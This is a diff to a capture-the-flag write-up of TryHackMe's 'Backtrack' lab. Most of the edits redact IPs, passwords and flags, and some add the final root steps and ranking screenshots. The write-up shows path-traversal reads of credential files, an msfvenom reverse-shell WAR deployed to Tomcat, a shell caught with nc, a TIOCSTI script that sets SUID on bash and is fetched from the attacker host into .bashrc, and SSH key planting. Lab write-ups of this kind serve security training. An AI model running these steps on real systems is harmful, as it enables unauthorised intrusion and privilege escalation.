@@ -4,7 +4,7 @@
 and I’m excited to join you on this adventure, part of my <code>493</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
 <em>Daring to set foot where no one has</em>.<br>
 Access it <a href="https://tryhackme.com/room/backtrack"</a>here.<br>
-<img width="1200px" src=""></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/e2bd0d98-5d3e-4405-bac7-2aac30c9f1db"></p>
 
 
 <h2>Task 1 . Deploy the machine and Get the Flags!</h2>
@@ -19,6 +19,7 @@ Note: Please allow at least 5 minutes for the machine to boot and configure.</p>
 
 <p>1.3. What is the content of flag3.txt<br>
 <code></code></p>
+
 
 
 <h2>nmap</h2>
@@ -240,7 +241,7 @@ Progress: 4614 / 4615 (99.98%)
 <h2>Web port 8888  .  /etc/passwd  .  catalina.out  .  tomcat-users.xml</h2>
 
 ```bash
-:~/Backtrack# curl --path-as-is http://10.201.46.180:8888/../../../../../../../../../../etc/passwd | grep '/bin/bash'
+:~/Backtrack# curl --path-as-is http://xx.xxx.xx.xxx:8888/../../../../../../../../../../etc/passwd | grep '/bin/bash'
 ...
 root:x:0:0:root:/root:/bin/bash
 orville:x:1003:1003::/home/orville:/bin/bash
@@ -249,7 +250,7 @@ wilbur:x:1004:1004::/home/wilbur:/bin/bash
 
 
 ```bash
-:~/Backtrack# curl --path-as-is http://10.201.46.180:8888/../../../../../../../../../../opt/tomcat/logs/catalina.out
+:~/Backtrack# curl --path-as-is http://xx.xxx.xx.xxx:8888/../../../../../../../../../../opt/tomcat/logs/catalina.out
 ...
 09-Mar-2024 11:57:18.198 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/webapps/ROOT]
 ...
@@ -258,7 +259,7 @@ wilbur:x:1004:1004::/home/wilbur:/bin/bash
 ```
 
 ```bash
-:~/Backtrack# curl --path-as-is http://10.201.46.180:8888/../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
+:~/Backtrack# curl --path-as-is http://xx.xxx.xx.xxx:8888/../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
 <?xml version="1.0" encoding="UTF-8"?>
 <tomcat-users xmlns="http://tomcat.apache.org/xml"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -266,7 +267,7 @@ wilbur:x:1004:1004::/home/wilbur:/bin/bash
               version="1.0">
 
   <role rolename="manager-script"/>
-  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>
+  <user username="tomcat" password="******************" roles="manager-script"/>
 
 </tomcat-users>
 ```
@@ -293,12 +294,6 @@ wilbur:x:1004:1004::/home/wilbur:/bin/bash
 
 <img width="1256" height="595" alt="image" src="https://github.com/user-attachments/assets/e7a5e415-340f-48cd-b1ca-5dda8ee630f7" />
 
-Server Information: IP Address: 127.0.0.1
-Client (Forwarded): 10.201.18.53
-Client (Actual): 10.201.18.53
-VHost: 10.201.20.109
-Request: GET /manager/status HTTP/1.1
-
 <p>
   
 - clicked Complete Server Status</p>
@@ -316,24 +311,24 @@ Request: GET /manager/status HTTP/1.1
 <br>
 
 ```bash
-:~/Backtrack# msfvenom -p java/shell_reverse_tcp lhost=10.201.18.53 lport=1234 -f war > shell.war
+:~/Backtrack# msfvenom -p java/shell_reverse_tcp lhost=xx.xxx.xx.xx lport=1234 -f war > shell.war
 Payload size: 13030 bytes
 Final size of war file: 13030 bytes
 ```
 
 ```bash
-:~/Backtrack# curl --upload-file shell.war -u 'tomcat:OPx52k53D8OkTZpx4fr' 'http://10.201.20.109:8080/manager/text/deploy?path=/rosana'
+:~/Backtrack# curl --upload-file shell.war -u 'tomcat:******************' 'http://xx.xxx.xx.xxx:8080/manager/text/deploy?path=/rosana'
 OK - Deployed application at context path [/rosana]
 ```
 
 ```bash
-:~/Backtrack# curl http://10.201.20.109:8080/rosana
+:~/Backtrack# curl http://xx.xxx.xx.xxx:8080/rosana
 ```
 
 ```bash
 :~/Backtrack# nc -nlvp 1234
 Listening on 0.0.0.0 1234
-Connection received on 10.201.20.109 46024
+Connection received on xx.xxx.xx.xxx 46024
 id
 uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -346,7 +341,6 @@ tomcat@Backtrack:/$ export TERM=xterm
 tomcat@Backtrack:/$
 ```
 
-
 ```bash
 tomcat@Backtrack:/$ find / type -name flag1.txt 2>/dev/null
 /opt/tomcat/flag1.txt
@@ -354,7 +348,7 @@ tomcat@Backtrack:/$ find / type -name flag1.txt 2>/dev/null
 
 ```bash
 tomcat@Backtrack:/$ cat /opt/tomcat/flag1.txt
-THM{823e4e40ead9683b06a8194eab01cee8}
+THM{********************************}
 ```
 
 ```bash
@@ -565,7 +559,7 @@ lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
 wilbur@Backtrack:~$ cat .just_in_case.txt
 in case i forget :
 
-wilbur:mYe317Tb9qTNrWFND7KF
+wilbur:********************
 ```
 
 ```bash
@@ -574,7 +568,7 @@ Hey Wilbur, it's Orville. I just finished developing the image gallery web app I
 I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:
 
 email : orville@backtrack.thm
-password : W34r3B3773r73nP3x3l$
+password : *******************
 ```
 
 ```bash
@@ -608,20 +602,10 @@ udp        0      0 10.201.20.109:68        0.0.0.0:*                           
 
 ```bash
 :~/Backtrack# ssh wilbur@backtrack -L 6969:127.0.0.1:80
-The authenticity of host 'backtrack (10.201.20.109)' can't be established.
-ECDSA key fingerprint is SHA256:+JTB+Hgw0CNKneGDp0fHaQB+RewZaOp94dMpORXS+Rk.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'backtrack,10.201.20.109' (ECDSA) to the list of known hosts.
+...
 wilbur@backtrack's password: 
 
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
--Xmx1024M: command not found
+...
 wilbur@Backtrack:~$ 
 ```
 
@@ -700,7 +684,9 @@ Content-Type: application/x-php
 <br>
 <br>
 
+```bash
 %25%32%65%25%32%65%25%32%66
+```
 
 ```bash
 HTTP/1.1 200 OK
@@ -743,6 +729,25 @@ dashboard.php  index.php  logout.php  register.php  rose.png.php
 ```
 
 ```bash
+orville@Backtrack:/var/www/html/includes$ cat db.php
+cat db.php
+<?php
+$host = 'localhost';
+$dbname = 'backtrack';
+$username = 'orville';
+$password = '*******************';
+
+try {
+    $db = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+} catch (PDOException $e) {
+    echo "Connection failed: " . $e->getMessage();
+    die();
+}
+?>
+```
+
+```bash
 orville@Backtrack:/home/orville$ ls -lah
 total 60K
 drwxrwx--- 2 orville orville 4.0K Sep 12 01:27 .
@@ -767,12 +772,10 @@ THM{********************************}
 <code>THM{********************************}</code></p>
 <br>
 <br>
-<h2>find / -perm -u=s -type f 2>/dev/null
-</h2>
+
 
 ```bash
 orville@Backtrack:/home/orville$ find / -perm -u=s -type f 2>/dev/null
-
 /usr/lib/openssh/ssh-keysign
 /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/eject/dmcrypt-get-device
@@ -794,63 +797,7 @@ orville@Backtrack:/home/orville$ find / -perm -u=s -type f 2>/dev/null
 ```bash
 orville@Backtrack:/tmp$ ps -eo pid,cmd
     PID CMD
-      1 /sbin/init
-      2 [kthreadd]
-      3 [rcu_gp]
-      4 [rcu_par_gp]
-      6 [kworker/0:0H-kblockd]
-      8 [mm_percpu_wq]
-      9 [ksoftirqd/0]
-     10 [rcu_sched]
-     11 [migration/0]
-     12 [idle_inject/0]
-     14 [cpuhp/0]
-     15 [kdevtmpfs]
-     16 [netns]
-     17 [rcu_tasks_kthre]
-     18 [kauditd]
-     19 [khungtaskd]
-     20 [oom_reaper]
-     21 [writeback]
-     22 [kcompactd0]
-     23 [ksmd]
-     24 [khugepaged]
-     70 [kintegrityd]
-     71 [kblockd]
-     72 [blkcg_punt_bio]
-     73 [xen-balloon]
-     74 [tpm_dev_wq]
-     75 [ata_sff]
-     76 [md]
-     77 [edac-poller]
-     78 [devfreq_wq]
-     79 [watchdogd]
-     82 [kswapd0]
-     83 [ecryptfs-kthrea]
-     85 [kthrotld]
-     86 [acpi_thermal_pm]
-     87 [xenbus]
-     88 [xenwatch]
-     89 [scsi_eh_0]
-     90 [kworker/0:1H-kblockd]
-     91 [scsi_tmf_0]
-     92 [scsi_eh_1]
-     93 [scsi_tmf_1]
-     95 [vfio-irqfd-clea]
-     96 [ipv6_addrconf]
-    107 [kstrp]
-    110 [kworker/u31:0]
-    123 [charger_manager]
-    157 [cryptd]
-    217 [raid5wq]
-    257 [jbd2/xvda1-8]
-    258 [ext4-rsv-conver]
-    326 /lib/systemd/systemd-journald
-    363 /lib/systemd/systemd-udevd
-    424 [kaluad]
-    425 [kmpath_rdacd]
-    426 [kmpathd]
-    427 [kmpath_handlerd]
+ ...
     428 /sbin/multipathd -d -s
     455 /lib/systemd/systemd-networkd
     457 /lib/systemd/systemd-resolved
@@ -882,40 +829,12 @@ orville@Backtrack:/tmp$ ps -eo pid,cmd
    4200 /bin/sh
    4324 python3 -c import pty;pty.spawn("/bin/bash")
    4325 /bin/bash
-   6767 sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../..
-   6768 python3 /usr/bin/ansible-playbook /opt/test_playbooks/../../../../tmp/sh
-   6770 /usr/sbin/uuidd --socket-activation
-   6951 python3 /usr/bin/ansible-playbook /opt/test_playbooks/../../../../tmp/sh
-   6963 /bin/sh -c /bin/sh -c '/usr/bin/python3 /tmp/ansible-tmp-1757637487.3240
-   6964 /bin/sh -c /usr/bin/python3 /tmp/ansible-tmp-1757637487.3240623-26675989
-   6965 /usr/bin/python3 /tmp/ansible-tmp-1757637487.3240623-266759896408792/Ans
-   6967 /bin/sh -c /bin/sh </dev/tty >/dev/tty 2>/dev/tty
-   6968 /bin/sh
-   7172 python3 -c import pty;pty.spawn("/bin/bash")
-   7173 /bin/bash
-   8203 sshd: wilbur [priv]
-   8325 /lib/systemd/systemd --user
-   8326 (sd-pam)
-   8401 sshd: wilbur@pts/3
-   8402 -bash
-   8569 /usr/sbin/apache2 -k start
-  10628 /usr/libexec/fwupd/fwupd
-  12565 sh -c uname -a; w; id; /bin/sh -i
-  12570 /bin/sh -i
-  12831 python3 -c import pty;pty.spawn("/bin/bash")
-  12832 /bin/bash
-  14978 /usr/sbin/apache2 -k start
-  14979 /usr/sbin/apache2 -k start
-  14989 /usr/sbin/apache2 -k start
-  14990 /usr/sbin/apache2 -k start
-  16235 [kworker/u30:3-events_power_efficient]
-  16390 /usr/sbin/apache2 -k start
-  16399 /usr/sbin/apache2 -k start
+...
 ```
 
 
 ```bash
-root@ip-10-201-18-53:~/Backtrack# cat script.py
+:~/Backtrack# cat script.py
 #!/usr/bin/env python3
 import fcntl
 import termios
@@ -928,25 +847,14 @@ for char in 'chmod +s /bin/bash\n':
     fcntl.ioctl(0, termios.TIOCSTI, char)
 ```
 
-
 ```bash
-  orville@Backtrack:/tmp$ wget http://10.201.18.53:8000/script.py
---2025-09-12 02:33:30--  http://10.201.18.53:8000/script.py
-Connecting to 10.201.18.53:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 193 [text/plain]
-Saving to: \u2018script.py\u2019
-
-script.py           100%[===================>]     193  --.-KB/s    in 0s      
-
-2025-09-12 02:33:31 (14.0 MB/s) - \u2018script.py\u2019 saved [193/193]
+orville@Backtrack:/tmp$ wget http://xx.xxx.xx.x/script.py
+...
 ```
-
 
 ```bash
 orville@Backtrack:/tmp$ echo 'python3 /tmp/script.py' >> /home/orville/.bashrc
 ```
-
 
 ```bash
 0rville@Backtrack:/home$ cd orville
@@ -964,28 +872,12 @@ lrwxrwxrwx 1 root    root       9 Mar  9  2024 .mysql_history -> /dev/null
 drwxr-xr-x 2 orville orville 4.0K Sep 12 02:07 .ssh
 -rw------- 1 orville orville   38 Mar  9  2024 flag2.txt
 -rwx------ 1 orville orville  37K Sep 12 01:27 web_snapshot.zip
-orville@Backtrack:/home/orville$ echo 'python3 /tmp/script.py' >> .bashrc
-orville@Backtrack:/home/orville$ ls -la
-total 68
-drwxrwx--- 4 orville orville  4096 Sep 12 02:10 .
-drwxr-xr-x 4 root    root     4096 Mar  9  2024 ..
-lrwxrwxrwx 1 root    root        9 Mar  9  2024 .bash_history -> /dev/null
--rw-r--r-- 1 orville orville  3817 Sep 12 02:37 .bashrc
-drwx------ 2 orville orville  4096 Sep 12 02:10 .cache
-lrwxrwxrwx 1 root    root        9 Mar  9  2024 .mysql_history -> /dev/null
--rw-r--r-- 1 orville orville   807 Mar  9  2024 .profile
-drwxr-xr-x 2 orville orville  4096 Sep 12 02:07 .ssh
--rw------- 1 orville orville    38 Mar  9  2024 flag2.txt
--rwx------ 1 orville orville 37572 Sep 12 01:27 web_snapshot.zip
 ```
-
-
 
 ```bash
 orville@Backtrack:/home/orville$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
 ```
-
 
 ```bash
 #!/usr/bin/env python3
@@ -998,41 +890,11 @@ os.kill(os.getppid(), signal.SIGSTOP)
 
 for char in 'chmod +s /bin/bash\n':
     fcntl.ioctl(0, termios.TIOCSTI, char)
-
-
-```bash
-:~/Backtrack# ssh-keygen -f id_r
 ```
-
-```bash
-:~/Backtrack# cat id_r.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAUZR4uQ4Bqb2+13q9Lkeb96NX4b/SQVYQhn18sFP/AUr4Zy+xZbpOPYIncHBOEWF6Pscn3HBlZAnFvbI8h11T/MIjmofCmvQjbuI9y0ACPgPC6FAii9epcE91htwRVFMK5MC/yAg/N0FuL+pTmq6YiekCQDYT5jRXFf2ytJU4XzXx65RTTNRvzC4/SMm/mp1vj4ZV3arzFGwaqyPjdp47SnUBYVignT1o77uALE+jzzZhrlfmdOULoHrI8LUp09Ky2bCC69PIw1mgXHe/bg1LVZgUwcIjQl4zA2M0r6wmpU5vicpbdszPQTPt3sLvG2g5rOivlKOv2nIvcEqA/IYfwwKTjMCtO0D2Q4tsaMWqhG7sI0M8g6wPucIS3Ymbe5KODHZBgToe1nd+PYfq8rgFzp0uX2iTVMoGLaAAGkuMK9OLrSjVhZKer55NKMjUO3ihWKge0dYwf5taSNmhlph9bc1B2x6PbixkWh95WjLlbVqSUarqZS+uzCbiW4qrak8= root@ip-10-201-18-53
-```
-
-
-```bash
-orville@Backtrack:/home/orville$ mkdir .ssh
-```
-
-```bash
-orville@Backtrack:/home/orville$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAUZR4uQ4Bqb2+13q9Lkeb96NX4b/SQVYQhn18sFP/AUr4Zy+xZbpOPYIncHBOEWF6Pscn3HBlZAnFvbI8h11T/MIjmofCmvQjbuI9y0ACPgPC6FAii9epcE91htwRVFMK5MC/yAg/N0FuL+pTmq6YiekCQDYT5jRXFf2ytJU4XzXx65RTTNRvzC4/SMm/mp1vj4ZV3arzFGwaqyPjdp47SnUBYVignT1o77uALE+jzzZhrlfmdOULoHrI8LUp09Ky2bCC69PIw1mgXHe/bg1LVZgUwcIjQl4zA2M0r6wmpU5vicpbdszPQTPt3sLvG2g5rOivlKOv2nIvcEqA/IYfwwKTjMCtO0D2Q4tsaMWqhG7sI0M8g6wPucIS3Ymbe5KODHZBgToe1nd+PYfq8rgFzp0uX2iTVMoGLaAAGkuMK9OLrSjVhZKer55NKMjUO3ihWKge0dYwf5taSNmhlph9bc1B2x6PbixkWh95WjLlbVqSUarqZS+uzCbiW4qrak8= root@ip-10-201-18-53' > .ssh/authorized_keys
-```
-
-
 
 
 ```bash
 orville@Backtrack:/home/orville$ cd /tmp
-orville@Backtrack:/tmp$ wget http://10.201.18.53:8000/pspy64
---2025-09-12 02:10:58--  http://10.201.18.53:8000/pspy64
-Connecting to 10.201.18.53:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3078592 (2.9M) [application/octet-stream]
-Saving to: \u2018pspy64\u2019
-
-pspy64              100%[===================>]   2.94M  3.33MB/s    in 0.9s    
-
-2025-09-12 02:10:59 (3.33 MB/s) - \u2018pspy64\u2019 saved [3078592/3078592]
 ```
 
 ```bash
@@ -1040,19 +902,9 @@ orville@Backtrack:/tmp$ chmod +x pspy64
 ```
 
 ```bash
-orville@Backtrack:/tmp$ 
-
-
-
-```bash
 orville@Backtrack:/tmp$ ./pspy64
-pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 ...
 ```
-
-
-
-
 
 
 ```bash
@@ -1221,6 +1073,127 @@ IncludeOptional sites-enabled/*.conf
 
 # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
 ```
+
+
+```bash
+orville@Backtrack:/home/orville$ curl http://xx.xxx.xx.x:8000/.bashrc -o .bashrc
+...
+orville@Backtrack:/home/orville$ ls -lah
+ls -lah
+[total 80K
+drwxrwx--- 4 orville orville 4.0K Sep 28 00:04 .
+drwxr-xr-x 4 root    root    4.0K Mar  9  2024 ..
+lrwxrwxrwx 1 root    root       9 Mar  9  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 orville orville 3.8K Sep 27 xx:xx .bashrc
+drwxrwxrwx 3 orville orville 4.0K Sep 27 xx:xx .local
+lrwxrwxrwx 1 root    root       9 Mar  9  2024 .mysql_history -> /dev/null
+-rw-r--r-- 1 orville orville  807 Mar  9  2024 .profile
+drwxrwxrwx 2 orville orville 4.0K Sep 27 xx:xx .ssh
+-rw------- 1 orville orville   38 Mar  9  2024 flag2.txt
+-rwxrwxrwx 1 orville orville  257 Sep 27 xx:xx getroot.py
+-rwx------ 1 orville orville  46K Sep 27 xx:xx web_snapshot.zip
+```
+
+```bash
+orville@Backtrack:/home/orville$ sudo -l
+sudo -l
+Matching Defaults entries for orville on Backtrack:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User orville may run the following commands on Backtrack:
+    (ALL) NOPASSWD: ALL
+```
+
+```bash
+orville@Backtrack:/home/orville$ sudo -l
+sudo -l
+Matching Defaults entries for orville on Backtrack:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User orville may run the following commands on Backtrack:
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+```
+
+```bash	
+orville@Backtrack:/home/orville$ sudo su -
+sudo su -
+```
+
+```bash
+root@Backtrack:~# pwd
+pwd
+/root
+```
+
+```bash
+root@Backtrack:~# ls
+ls
+flag3.txt  manage.py  snap
+```
+
+```bash
+root@Backtrack:~# cat flag3.txt
+cat flag3.txt
+THM{**********************************}
+```
+
+<img width="826" height="329" alt="image" src="https://github.com/user-attachments/assets/30391861-469c-44fc-b2b4-0de0601c6ef3" />
+
+<br>
+<br>
+
+
+
+
+
+
+
+
+Completed
+
+
+<img width="1901" height="902" alt="image" src="https://github.com/user-attachments/assets/144399dc-55d4-47e6-984a-01db60677260" />
+
+<img width="1905" height="894" alt="image" src="https://github.com/user-attachments/assets/9ff0b1d9-63d8-4f7d-8b32-b69093fb3522" />
+
+
+
+509      109      127,334     969     76
+
+
+Badge
+
+<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/3b8abfa0-9933-4f2d-a09e-361cce0391b8" />
+
+
+
+Yearly Board
+
+<img width="1890" height="883" alt="image" src="https://github.com/user-attachments/assets/a91126bd-7473-4550-9459-217bb3eb857c" />
+
+
+
+4th  Brazil All Time
+
+<img width="1882" height="892" alt="image" src="https://github.com/user-attachments/assets/340a9e61-53b2-485f-b86e-1614d94ab469" />
+
+
+318 th Global Montlhy
+
+
+<img width="1892" height="894" alt="image" src="https://github.com/user-attachments/assets/80a0dd0e-a744-4163-b4de-b973d5bc8c71" />
+
+
+
+5th  Brazil Montlhy
+
+<img width="1890" height="887" alt="image" src="https://github.com/user-attachments/assets/7802998e-f983-48e8-a107-159a1e1ba352" />
+
+
+
 
 
 
